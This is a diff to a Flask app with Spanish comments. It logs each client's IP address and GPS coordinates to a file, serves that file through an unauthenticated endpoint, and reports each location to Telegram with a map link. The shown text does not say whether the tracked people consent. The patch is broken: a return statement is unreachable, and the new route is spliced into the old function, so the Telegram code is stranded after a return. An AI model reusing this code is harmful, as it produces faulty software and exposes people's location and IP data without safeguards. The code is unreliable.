@@ -54,11 +54,34 @@ def guardar_ubicacion():
     data = request.get_json()
     lat, lon = data.get('lat'), data.get('lon')
     if lat and lon:
-        # Guardar en archivo
-        historial = cargar_datos()
-        historial.append({"id": request.remote_addr, "lat": float(lat), "lng": float(lon)})
-        guardar_datos(historial[-50:])
+
+        # 1. Leer el historial actual del archivo
+        historial = []
+        if os.path.exists(DATA_FILE):
+            with open(DATA_FILE, 'r') as f:
+                try:
+                    historial = json.load(f)
+                except:
+                    historial = []
         
+        # 2. Agregar el nuevo punto
+        # Usamos el IP del cliente como ID
+        historial.append({"id": request.remote_addr, "lat": float(lat), "lng": float(lon)})
+        
+        # 3. Guardar en el archivo (mantenemos solo los Ultimos 50 registros)
+        with open(DATA_FILE, 'w') as f:
+            json.dump(historial[-50:], f)
+            
+        return "OK", 200
+        return "Error", 400
+    
+@app.route('/obtener_ubicaciones')
+def obtener_ubicaciones():
+    if os.path.exists(DATA_FILE):
+        with open(DATA_FILE, 'r') as f:
+            return f.read()
+        return json.dumps([])
+    
         # Reportar a Telegram
         map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
         mensaje = (f"📍 <b>Ubicación detectada</b>\n"
